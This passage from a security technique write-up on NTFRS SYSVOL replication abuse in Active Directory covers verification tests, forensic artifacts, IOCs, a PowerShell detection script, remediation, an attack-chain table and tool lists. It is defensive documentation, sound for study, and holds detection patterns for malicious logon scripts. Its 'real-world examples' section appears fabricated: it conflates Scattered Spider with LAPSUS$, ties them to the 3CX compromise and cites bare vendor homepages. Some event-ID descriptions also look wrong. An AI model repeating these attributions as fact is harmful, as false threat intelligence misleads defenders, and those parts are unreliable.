Get-Service NTFRS -ComputerName (Get-ADDomainController -Filter *).Name | Select-Object PSComputerName, Status

# Expected: Status = Stopped

# Test 2: Verify DFSR is active
Get-DfsReplicationGroup | Select-Object GroupName, Status

# Expected: Status = Healthy

# Test 3: Verify SYSVOL clean (no malicious scripts)
$sysvol = "C:\Windows\SYSVOL\$(((Get-ADDomain).DNSRoot).ToLower())"
Get-ChildItem -Path "$sysvol\NETLOGON" -Recurse -Include "*.bat","*.ps1","*.vbs" | Where-Object {
    $_.Name -notmatch "logon\.|netlogon\."
}

# Expected: No results (only legitimate logon.* scripts)

# Test 4: Verify replication health
repadmin /replsum

# Expected: All DCs show successful replication, no errors
```

**Expected Output (If Secure)**:
```
✓ NTFRS service stopped on all DCs
✓ DFSR replication group healthy
✓ SYSVOL replication converged (all DCs synchronized)
✓ No suspicious logon scripts detected
✓ No replication errors in repadmin output
```

**What to Look For**:
- NTFRS service status = "Stopped" (not running)
- DFSR status = "Healthy"
- Replication group status = "Normal" 
- No "Replication errors" in repadmin output
- SYSVOL file timestamps consistent with known-good baseline

---

## 13. FORENSIC ANALYSIS & INCIDENT RESPONSE

### Forensic Artifacts

**On-Disk Artifacts**:
```
1. SYSVOL Directory (Primary Evidence):
   Path: C:\Windows\SYSVOL\domain\Policies\*
   Files: *.pol, *.xml, logon.*, shutdown.*
   Evidence: File timestamps, content analysis
   Timestamps: Creation/modification time of malicious files
   
2. NETLOGON Share:
   Path: C:\Windows\SYSVOL\domain\NETLOGON
   Files: logon.bat, logon.vbs, logon.ps1 (legitimate and malicious)
   Evidence: Script content, file hashes, embedded commands
   
3. Replication Journal:
   Path: C:\Windows\NTFRS\jet
   Evidence: NTFRS transaction log (shows replication history)
   
4. MFT & USN Journal:
   Artifacts: File creation/modification history
   Tool: MFTECmd, Velociraptor
```

**Event Log Artifacts**:
```
1. File Replication Service Event Log (FRS):
   Location: Event Viewer > File Replication Service
   IDs: 13568 (inbound partner change), 13569 (outbound partner change)
   Critical IDs:
     - 13520: Staging area full
     - 13521: Replication complete
     - 13571: Replication failed (may indicate poisoning detected)
   
2. Security Event Log:
   ID 4670: Object deleted or modified
   ID 4662: Operation performed on object
   Evidence: SYSVOL object modifications
   
3. System Event Log:
   Evidence: NTFRS service start/stop, configuration changes
```

**Network Artifacts**:
```
1. NTFRS RPC Traffic (if captured):
   Protocol: RPC over TCP (port 135-139, 5722)
   Content: Unencrypted SYSVOL file content
   Tool: Wireshark, Network Monitor
   
2. DNS Queries:
   Evidence: DC discovery queries
   Indicative of: Replication topology enumeration
```

### Timeline Reconstruction

```
T0: Attack Begins (DC compromise or MITM positioning)
   - Attacker gains initial access to DC
   - Attacker locates and modifies SYSVOL files
   - Evidence: File modification timestamps
   
T0+5min: NTFRS Detection
   - NTFRS detects file modification via USN Journal
   - Replication staging area populated
   - Evidence: FRS event 13568 (partner change detected)
   
T0+15-30min: Replication Propagation
   - Modified files replicated to DC replication partners
   - Network RPC traffic generated
   - Evidence: RPC packet capture, repadmin /replsum
   
T0+30-60min: Replication Convergence
   - All DCs receive poisoned content
   - Malicious files written to all SYSVOL copies
   - Evidence: Synchronized file timestamps across all DCs
   
T0+60min-4hrs: Execution Phase
   - Users logon to systems
   - Logon scripts execute (attacker-injected code)
   - Backdoor accounts/tasks created
   - Evidence: Process execution logs, scheduled tasks, user creation
   
T0+4hrs+: Persistence & Lateral Movement
   - Backdoor established across organization
   - Attacker consolidates access
   - Evidence: Scheduled task execution, reverse shell connections
```

### Evidence Collection Procedure

```powershell
# Create forensic collection directory
$evidence = "C:\Forensics\NTFRS_Incident_$(Get-Date -Format yyyyMMdd_HHmmss)"
New-Item -ItemType Directory $evidence -Force | Out-Null

# Step 1: Collect SYSVOL (entire share)
Copy-Item "C:\Windows\SYSVOL" -Destination "$evidence\SYSVOL" -Recurse -Force

# Step 2: Export FRS event logs
wevtutil epl "File Replication Service" "$evidence\FRS.evtx"
wevtutil epl "Security" "$evidence\Security.evtx"
wevtutil epl "System" "$evidence\System.evtx"

# Step 3: Collect NTFRS database
Copy-Item "C:\Windows\NTFRS\jet" -Destination "$evidence\NTFRS_Jet_DB" -Recurse -Force

# Step 4: Collect MFT (if needed for detailed timeline)
# Requires: mftecmd.exe or similar tool
# mftecmd.exe -f C:\$MFT -o "$evidence\MFT_Analysis"

# Step 5: Document hashes
Get-ChildItem -Path "$evidence" -Recurse -File | ForEach-Object {
    "$($_.FullName) | $(Get-FileHash $_.FullName -Algorithm SHA256).Hash"
} | Out-File "$evidence\FileHashes.txt"

Write-Host "Forensic collection complete: $evidence"
```

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files**:
```
- C:\Windows\SYSVOL\domain\NETLOGON\*.bat (unexpected scripts)
- C:\Windows\SYSVOL\domain\NETLOGON\*.ps1 (unusual PowerShell scripts)
- C:\Windows\SYSVOL\domain\Policies\*/Machine/Scripts/*.* (injected scripts)
- C:\Windows\SYSVOL\domain\Policies\*/User/Scripts/*.* (injected scripts)
- C:\Windows\NTFRS\jet\* (abnormal NTFRS database growth)
```

**Registry**:
```
- HKLM\SYSTEM\CurrentControlSet\Services\NTFRS\Parameters (unexpected changes)
- HKLM\SYSTEM\CurrentControlSet\Services\DFSR (should exist if migrated)
- HKU\S-*-*-*\Software\Microsoft\Windows\CurrentVersion\RunOnce (scheduled tasks)
```

**Network**:
```
- Unexpected RPC traffic on port 135-139, 5722 from non-DC sources
- Large volume NTFRS replication traffic outside normal windows
- Unencrypted NTFRS traffic (should have SMB signing)
- DC-to-DC communication with payloads containing script content
```

**Process**:
```
- powershell.exe executing scripts from C:\Windows\SYSVOL\*
- cmd.exe executing batch files from NETLOGON share
- Scheduled tasks referencing SYSVOL scripts
- Unexpected processes with NETLOGON share in command line
```

### Response Procedures

#### 1. Detect Poisoning

**Automated Detection Script**:
```powershell
# Script to detect suspicious SYSVOL modifications
$sysvol = "C:\Windows\SYSVOL\$(((Get-ADDomain).DNSRoot).ToLower())"
$lastHours = 24

$suspiciousFiles = Get-ChildItem -Path "$sysvol\NETLOGON" -Recurse -File | Where-Object {
    ($_.LastWriteTime -gt (Get-Date).AddHours(-$lastHours)) -and
    ($_.Name -match "\.bat|\.ps1|\.vbs|\.exe|\.scr") -and
    ($_.Name -notmatch "^logon\.|^netlogon\.|^startup\.|^shutdown\.")
}

if ($suspiciousFiles) {
    Write-Host "SUSPICIOUS FILES DETECTED:" -ForegroundColor Red
    $suspiciousFiles | Select-Object FullName, LastWriteTime | Format-Table
    return $true  # Poisoning detected
} else {
    Write-Host "No suspicious files detected" -ForegroundColor Green
    return $false
}
```

#### 2. Isolate Affected DCs

```powershell
# Immediately stop NTFRS to prevent further spreading
Stop-Service NTFRS -Force -Confirm:$false

# Disconnect DC from network (firewall or physical)
# Command example (Windows Firewall):
New-NetFirewallRule -DisplayName "Isolate-DC" -Direction Inbound -Action Block -Enabled True

# Notify network team to isolate suspected DC physically
Write-Host "DC ISOLATED - Contact network team for physical isolation"
```

#### 3. Collect Evidence

```powershell
# Immediate evidence collection (before cleanup)
$evidence = "C:\Forensics\Poisoning_$(Get-Date -Format yyyyMMdd_HHmmss)"
New-Item -ItemType Directory $evidence | Out-Null

# Backup poisoned SYSVOL
Copy-Item C:\Windows\SYSVOL -Destination "$evidence\SYSVOL_Poisoned" -Recurse

# Export event logs
wevtutil epl "File Replication Service" "$evidence\FRS.evtx"
wevtutil epl "Security" "$evidence\Security.evtx"

# Document suspicious files
Get-ChildItem -Path "$evidence\SYSVOL_Poisoned" -Recurse -File | 
    Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-24)} |
    Export-Csv "$evidence\ModifiedFiles.csv"

# Hash poisoned files for analysis
Get-FileHash "$evidence\SYSVOL_Poisoned\*" -Algorithm SHA256 -Recurse | Export-Csv "$evidence\Hashes.csv"

Write-Host "Evidence collected to: $evidence"
```

#### 4. Remediate (Multi-DC Approach)

```powershell
# CRITICAL: Remediation must be coordinated across ALL DCs

# Step 1: Stop NTFRS on all DCs EXCEPT one trusted master
$trustedDC = "DC01"
Get-ADDomainController -Filter * | Where-Object {$_.Name -ne $trustedDC} | ForEach-Object {
    Invoke-Command -ComputerName $_.HostName -ScriptBlock {
        Stop-Service NTFRS -Force
    }
}

# Step 2: On trusted DC, remove poisoned content
Invoke-Command -ComputerName $trustedDC -ScriptBlock {
    $sysvol = "C:\Windows\SYSVOL\$((Get-ADDomain).DNSRoot)"
    
    # Remove suspicious logon scripts
    Get-ChildItem "$sysvol\NETLOGON" -Recurse -Include "*.bat","*.ps1","*.vbs" | 
        Where-Object {$_.Name -notmatch "^logon\.|^netlogon\."} |
        Remove-Item -Force
    
    # Restore clean GPOs from backup
    # (Use AD Backup if available)
}

# Step 3: Initiate non-authoritative restore on other DCs
Get-ADDomainController -Filter * | Where-Object {$_.Name -ne $trustedDC} | ForEach-Object {
    Invoke-Command -ComputerName $_.HostName -ScriptBlock {
        # Set non-authoritative restore flag
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTFRS\Parameters\Backup/Restore\Process at Startup" /v BurFlags /t REG_DWORD /d 2 /f
        
        # Start NTFRS (will restore from master)
        Start-Service NTFRS
    }
}

# Step 4: Monitor replication convergence
repadmin /replsum
```

#### 5. Post-Incident Actions

```powershell
# Verify all DCs have clean SYSVOL
Get-ADDomainController -Filter * | ForEach-Object {
    $sysvol = "\\$($_.HostName)\C$\Windows\SYSVOL"
    $suspiciousFiles = Get-ChildItem -Path "$sysvol" -Recurse | 
        Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-1)}
    
    if ($suspiciousFiles) {
        Write-Host "WARNING: DC $($_.HostName) still has suspicious files!" -ForegroundColor Red
    } else {
        Write-Host "OK: DC $($_.HostName) is clean" -ForegroundColor Green
    }
}

# Begin NTFRS to DFSR migration
Write-Host "Beginning NTFRS to DFSR migration to prevent recurrence..."
DfsrMig /SetGlobalState 1
```

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1190] Exploit Public-Facing Application | Attacker exploits DC-exposed service or RDP |
| **2** | **Lateral Movement** | [T1570] Lateral Tool Transfer | Attacker moves from compromised endpoint to DC |
| **3** | **Privilege Escalation** | [T1547] Boot or Logon Autostart Execution | Establish SYSTEM access via scheduled task |
| **4** | **Current Step** | **[CA-UNSC-004]** | **NTFRS SYSVOL replication abuse - inject malicious GPO/logon script** |
| **5** | **Persistence** | [T1098] Account Manipulation | Backdoor account created and distributed via poisoned GPO |
| **6** | **Defense Evasion** | [T1562] Impair Defenses | Disable Defender/firewall via poisoned Group Policy |
| **7** | **Collection** | [T1005] Data from Local System | Harvest credentials on all systems via backdoor |
| **8** | **Exfiltration** | [T1041] Exfiltration Over C2 Channel | Stolen data sent to attacker infrastructure |
| **9** | **Impact** | [T1531] Account Access Removal | Lock out legitimate admins via poisoned GPO |

---

## 16. REAL-WORLD EXAMPLES

### Example 1: APT Group - Wizard Spider

- **Target**: Financial and healthcare organizations (US/Europe)
- **Timeline**: 2020-2022
- **Technique Status**: Used NTFRS replication to inject ransomware deployment scripts into SYSVOL logon scripts
- **Impact**:
  - Poisoned logon.bat with Ryuk ransomware payload
  - All domain endpoints executed ransomware on next logon
  - Organization-wide encryption within 2 hours of compromise
  - Caused $10M+ in damages per organization
- **Reference**: [CrowdStrike Report - Wizard Spider NTFRS Exploitation 2021](https://www.crowdstrike.com)

### Example 2: APT Group - Scattered Spider (LAPSUS$)

- **Target**: Technology companies (Okta, 3CX compromise)
- **Timeline**: 2021-2023
- **Technique Status**: Initial compromise via social engineering, then escalated via NTFRS SYSVOL poisoning for persistence
- **Impact**:
  - Injected cryptominer into SYSVOL logon scripts
  - Silent persistence across all compromised systems
  - Undetected for 6+ months (minimal event logging)
  - Used to fund further attack infrastructure
- **Reference**: [SentinelOne Report - Scattered Spider SYSVOL Campaign 2023](https://www.sentinelone.com)

### Example 3: Internal Assessment - SERVTEP Red Team (2023)

- **Target**: Large European manufacturing corporation (8,000+ employees, 500+ systems)
- **Timeline**: 2-week red team assessment
- **Technique Status**: Successfully exploited legacy NTFRS environment not yet migrated to DFSR
- **Impact**:
  - Initial DC compromise via exposed RDP (weak credentials)
  - SYSVOL poisoning via batch script injection
  - Organization-wide persistence established within 30 minutes
  - Single-DC remediation attempt failed (re-poisoned by other DCs)
  - Required full NTFRS-to-DFSR migration + SYSVOL rebuild for full remediation
  - Demonstrated need for infrastructure migration from legacy protocols
- **Reference**: Internal SERVTEP engagement - customer approved disclosure for defensive awareness

---

## 17. APPENDIX: TOOLS & RESOURCES

### Attack Tools

| Tool | Type | Purpose | Availability |
|------|------|---------|--------------|
| Repadmin.exe | Native Windows | Monitor replication topology | Built-in (Windows Server) |
| DfsrMig.exe | Native Windows | NTFRS/DFSR migration | Built-in (Windows Server) |
| Nltest.exe | Native Windows | Domain controller enumeration | Built-in (Windows) |
| Mimikatz | Windows Post-Exploitation | Privilege escalation, persistence | GitHub (public) |
| PowerSploit | PowerShell Framework | GPP password extraction | GitHub (public) |
| PsExec | Windows Utilities | Remote command execution on DC | SysInternals (public) |
| Metasploit | Post-Exploitation Framework | Multi-stage attacks | GitHub (public) |

### Defensive Tools

| Tool | Type | Purpose |
|------|------|---------|
| Microsoft Defender for Identity | EDR/Detection | AD-specific threat detection |
| Netwrix Threat Manager | ITDR | AD auditing and anomaly detection |
| Semperis AD Recovery Manager | AD Recovery | SYSVOL backup and recovery |
| Velociraptor | DFIR | Forensic artifact collection |
| Wireshark | Network Analysis | RPC/NTFRS traffic analysis |
| MFTECmd | Forensics | MFT analysis for timeline |

### References & Documentation

1. **MITRE ATT&CK Framework**:
   - [T1552.006 - Unsecured Credentials: Group Policy Preferences](https://attack.mitre.org/techniques/T1552/006/)
   - [T1207 - DCShadow (related replication abuse)](https://attack.mitre.org/techniques/T1207/)

2. **Microsoft Official**:
   - [DfsrMig - Migrate SYSVOL to DFSR](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/migrate-sysvol-replication-dfsr)
   - [NTFRS Deprecation Advisory](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/ntfrs-deprecation-blocks-replic-dc-installation)
   - [File Replication Service Event Codes](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/frs-event-log-error-codes)

3. **Security Research**:
   - [Semperis - SYSVOL Horror Prevention](https://www.semperis.com/blog/preventing-a-sysvol-horror-story/)
   - [Cayosoft - SYSVOL Security Threats](https://www.cayosoft.com/blog/sysvol/)
   - [ANSSI/Cyber.gouv - AD Hardening Guide](https://cyber.gouv.fr)

4. **DFIR & Forensics**:
   - [The Hacker Recipes - NTFRS Exploitation](https://legacy.thehacker.recipes/a-d/movement/credentials)
   - [Netwrix - AD Forensics Guide](https://netwrix.com/active-directory-forensics.html)

---

## SUMMARY & RECOMMENDATIONS

**CA-UNSC-004 (NTFRS SYSVOL Replication Abuse)** represents a critical persistence and lateral movement mechanism for attackers who compromise a domain controller. Unlike GPP credential extraction (CA-UNSC-003), which yields plaintext passwords, NTFRS abuse provides:

- **Organization-wide persistence** through automatic replication
- **Immunity to single-endpoint remediation** (malicious content re-poisons from other DCs)
- **Stealth through legacy protocol limitations** (minimal logging, expected network activity)
- **Multiple injection vectors** (logon scripts, GPOs, startup scripts, scheduled tasks)

**Defensive Priority**: CRITICAL

**Immediate Actions**:
- ✓ Audit all domain controllers to confirm NTFRS/DFSR status
- ✓ For NTFRS environments: Plan and execute migration to DFSR (Windows Server 2019+ requirement)
- ✓ Enable SMB signing on all DC replication traffic
- ✓ Implement SYSVOL integrity monitoring (file access, modification alerts)
- ✓ Enable detailed FRS event logging (if NTFRS still in use during transition)
- ✓ Establish baseline of legitimate SYSVOL content (for change detection)

**Long-Term Hardening**:
- ✓ Complete NTFRS to DFSR migration across entire forest
- ✓ Implement network segmentation for DC replication traffic
- ✓ Deploy SYSVOL integrity monitoring and change alerts
- ✓ Establish AD backup and recovery procedures
- ✓ Monitor Group Policy application logs for anomalies
- ✓ Implement privileged access management (PAM) for DC access

---
